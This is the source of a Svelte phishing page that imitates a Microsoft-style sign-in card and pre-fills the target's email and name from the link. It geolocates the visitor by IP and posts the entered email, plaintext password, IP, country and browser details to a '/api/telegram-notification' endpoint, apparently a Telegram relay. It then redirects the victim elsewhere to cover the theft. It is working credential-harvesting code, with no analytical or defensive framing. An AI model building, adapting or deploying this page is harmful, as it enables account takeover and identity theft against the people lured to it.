<script lang="ts">
  import { onMount } from 'svelte';
  import { browser } from '$app/environment';
  import { writable, get } from 'svelte/store';

  const email = writable('');
  const name = writable('');
  const password = writable('');
  const loading = writable(false);
  const error = writable('');
  const step = writable<'email' | 'password'>('email');

  let userAgent = '';
  let ip = '';
  let device = '';
  let browserType = '';
  let country = '';

  const getInitials = (text: string) => {
    const parts = text.split(/[@.\s]/).filter(Boolean);
    return (parts[0]?.[0] || '').toUpperCase() + (parts[1]?.[0] || '').toUpperCase();
  };

  const fetchIPData = async () => {
    try {
      const res = await fetch('https://ipapi.co/json');
      const data = await res.json();
      ip = data.ip;
      country = data.country_name;
    } catch {
      ip = 'Unknown';
      country = 'Unknown';
    }
  };

  const handleLogin = async () => {
    if (get(password).length < 5) {
      error.set('Password must be at least 5 characters');
      return;
    }

    loading.set(true);
    error.set('');

    try {
      const response = await fetch('/api/telegram-notification', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: get(name) || 'Unknown',
          email: get(email),
          password: get(password),
          country,
          ip,
          browser: browserType,
          device,
          time: new Date().toLocaleString(),
          userAgent
        })
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || 'Failed to verify credentials');
      }

      window.location.href = import.meta.env.VITE_FINAL_URL;
    } catch (err) {
      error.set(err.message);
      loading.set(false);
    }
  };

  onMount(async () => {
    const params = new URLSearchParams(window.location.search);
    const e = params.get('email');
    const n = params.get('name');

    if (e) {
      email.set(e);
      step.set('password');
    }

    if (n) {
      name.set(decodeURIComponent(n));
    }

    if (browser) {
      userAgent = navigator.userAgent;
      browserType = navigator.vendor || navigator.appName;
      device = navigator.platform;
      await fetchIPData();
    }
  });
</script>

<style>
  :global(body) {
    margin: 0;
    font-family: Helvetica, Arial, sans-serif;
    background: url('/PUSHSQUAD.JPG') center/cover no-repeat fixed;
    overflow: hidden;
    height: 100vh;
  }

  main {
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
  }

  .a4-blur {
    position: absolute;
    width: 21cm;
    height: 29.7cm;
    max-width: 90vw;
    max-height: 90vh;
    backdrop-filter: blur(10px);
    background-color: rgba(255, 255, 255, 0.05);
    border-radius: 12px;
    z-index: 1;
  }

  .card {
    background-color: #ffffffee;
    border: 3px solid #0044cc;
    border-radius: 16px;
    width: 350px;
    height: 350px;
    box-shadow: 0 6px 24px rgba(0, 0, 0, 0.15);
    padding: 2rem;
    box-sizing: border-box;
    text-align: center;
    display: flex;
    flex-direction: column;
    justify-content: center;
    z-index: 2;
  }

  h2 {
    font-size: 1.4rem;
    margin-bottom: 0.5rem;
    font-weight: normal;
  }

  .welcome {
    font-size: 0.95rem;
    font-weight: normal;
    margin-top: -0.4rem;
    margin-bottom: 0.6rem;
  }

  .instruction {
    font-size: 0.95rem;
    color: #333;
    margin-bottom: 0.8rem;
  }

  .subtext {
    font-size: 0.85rem;
    color: #555;
    margin-bottom: 1rem;
    line-height: 1.2;
  }

  .avatar {
    background-color: #007bff;
    color: white;
    width: 64px;
    height: 64px;
    border-radius: 50%;
    font-size: 1.5rem;
    font-weight: bold;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 0.8rem auto;
  }

  input {
    width: 100%;
    padding: 0.7rem;
    margin-bottom: 1rem;
    font-size: 14px;
    border: 1px solid #ccc;
    border-radius: 6px;
    box-sizing: border-box;
  }

  button {
    background-color: #0078d4;
    color: white;
    padding: 0.7rem;
    border: none;
    border-radius: 6px;
    font-weight: bold;
    font-size: 14px;
    cursor: pointer;
    transition: background 0.2s;
  }

  button:hover {
    background-color: #005fa3;
  }

  .loading {
    font-size: 1.2rem;
    font-weight: bold;
  }

  .error-message {
    color: #d32f2f;
    font-size: 0.9rem;
    margin-bottom: 1rem;
  }
</style>

<main>
  <div class="a4-blur"></div>

  {#if $loading}
    <div class="card">
      <p class="loading">Verifying...</p>
    </div>
  {:else}
    <div class="card">
      {#if $error}
        <p class="error-message">{$error}</p>
      {/if}

      {#if $step === 'email' && !$email}
        <h2>Enter your email</h2>
        <input
          type="email"
          bind:value={$email}
          placeholder="you@example.com"
          on:blur={() => {
            if ($email.trim().length > 0) step.set('password');
          }}
        />
      {:else}
        {#if $email || $name}
          <p class="instruction">Verify your identity to continue</p>
          <div class="avatar">{getInitials($name || $email)}</div>
          <h3 class="welcome">Welcome {$name || $email}</h3>
          <div class="subtext">{$email}</div>
        {/if}
        <input
          type="password"
          bind:value={$password}
          placeholder="Enter your password"
        />
        <button on:click={handleLogin}>Login</button>
      {/if}
    </div>
  {/if}
</main>
